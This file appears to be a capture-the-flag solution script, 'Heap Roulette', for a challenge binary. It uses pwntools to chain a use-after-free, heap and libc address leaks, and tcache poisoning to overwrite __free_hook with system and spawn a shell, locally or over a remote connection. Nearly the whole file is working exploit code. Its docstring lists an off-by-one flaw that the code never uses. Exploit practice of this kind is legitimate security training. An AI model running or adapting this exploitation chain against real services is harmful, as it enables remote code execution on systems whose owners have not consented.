#!/usr/bin/env python3
"""
Heap Roulette - Solution Script
Demonstrates tcache poisoning to overwrite __free_hook

Vulnerabilities used:
1. Use-After-Free (delete doesn't zero pointer)
2. Off-by-one overflow in edit
3. Information leak via view on freed chunks

Attack path:
1. Allocate chunks
2. Free them (they go to tcache)
3. Use UAF to overwrite tcache fd pointer
4. Allocate to get chunk at __free_hook
5. Overwrite __free_hook with system
6. Free chunk containing "/bin/sh"
"""

from pwn import *

# Configuration
BINARY = './heap_roulette'
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'

elf = ELF(BINARY)
libc = ELF(LIBC)

def conn():
    if args.REMOTE:
        return remote(args.HOST, args.PORT)
    else:
        return process(BINARY)

def create(p, size, content):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
    p.recvuntil(b'Created note ')

def edit(p, idx, content):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'New content: ')
    p.send(content)
    p.recvuntil(b'Updated!')

def delete(p, idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Deleted!')

def view(p, idx):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Content: ')
    content = p.recvline().strip()
    return content

def exploit():
    p = conn()
    
    # Step 1: Create some chunks
    log.info("Creating initial chunks...")
    create(p, 0x20, b'A' * 0x20)  # note 0
    create(p, 0x20, b'B' * 0x20)  # note 1
    create(p, 0x20, b'C' * 0x20)  # note 2
    
    # Step 2: Free chunks to populate tcache
    log.info("Freeing chunks to tcache...")
    delete(p, 0)
    delete(p, 1)
    delete(p, 2)
    
    # Step 3: Leak heap address via UAF
    # After freeing, tcache stores fd pointer in the chunk
    # We can read it via view
    log.info("Leaking heap address...")
    heap_leak = view(p, 0)
    heap_addr = u64(heap_leak.ljust(8, b'\x00'))
    log.info(f"Heap leak: {hex(heap_addr)}")
    
    # Step 4: Leak libc address
    # We need to get a chunk into unsorted bin to leak libc
    # Allocate larger chunks and free them
    create(p, 0x400, b'X' * 0x400)  # note 3 - will go to unsorted bin
    create(p, 0x20, b'Y' * 0x20)    # note 4 - padding to prevent consolidation
    
    delete(p, 3)  # Goes to unsorted bin
    
    # View freed chunk to get libc address from fd/bk
    libc_leak = view(p, 3)
    libc_addr = u64(libc_leak.ljust(8, b'\x00'))
    libc_base = libc_addr - 0x1ebb61  # Offset to main_arena+96 (adjust for target libc)
    
    log.info(f"Libc leak: {hex(libc_addr)}")
    log.info(f"Libc base: {hex(libc_base)}")
    
    # Calculate target addresses
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    
    log.info(f"__free_hook: {hex(free_hook)}")
    log.info(f"system: {hex(system_addr)}")
    
    # Step 5: Tcache poisoning
    # We'll overwrite tcache fd to point to __free_hook
    
    # First, get chunks in tcache
    create(p, 0x20, b'A' * 0x20)  # note 5
    create(p, 0x20, b'B' * 0x20)  # note 6
    
    delete(p, 5)
    delete(p, 6)
    
    # Now tcache has: 6 -> 5 -> ...
    # We use UAF on note 6 to overwrite fd to __free_hook
    
    log.info("Tcache poisoning...")
    # Overwrite fd pointer (first 8 bytes of freed chunk)
    edit(p, 6, p64(free_hook))
    
    # Allocate to consume first entry
    create(p, 0x20, b'Z' * 0x20)  # note 7 - gets chunk 6
    
    # Next allocation will return __free_hook!
    create(p, 0x20, p64(system_addr))  # note 8 - overwrites __free_hook
    
    # Step 6: Trigger system("/bin/sh")
    log.info("Triggering shell...")
    
    # Create chunk with "/bin/sh"
    create(p, 0x20, b'/bin/sh\x00')  # note 9
    
    # Delete it - this calls free(note9->content)
    # free("/bin/sh") -> system("/bin/sh") because __free_hook = system
    delete(p, 9)
    
    log.success("Got shell!")
    p.interactive()

if __name__ == '__main__':
    print("=" * 50)
    print("Heap Roulette - Solution Script")
    print("=" * 50)
    print()
    print("Attack: Tcache Poisoning → __free_hook overwrite")
    print()
    print("Vulnerabilities:")
    print("1. Use-After-Free (delete doesn't zero pointer)")
    print("2. Off-by-one overflow in edit")
    print("3. Info leak via view on freed chunks")
    print()
    
    exploit()
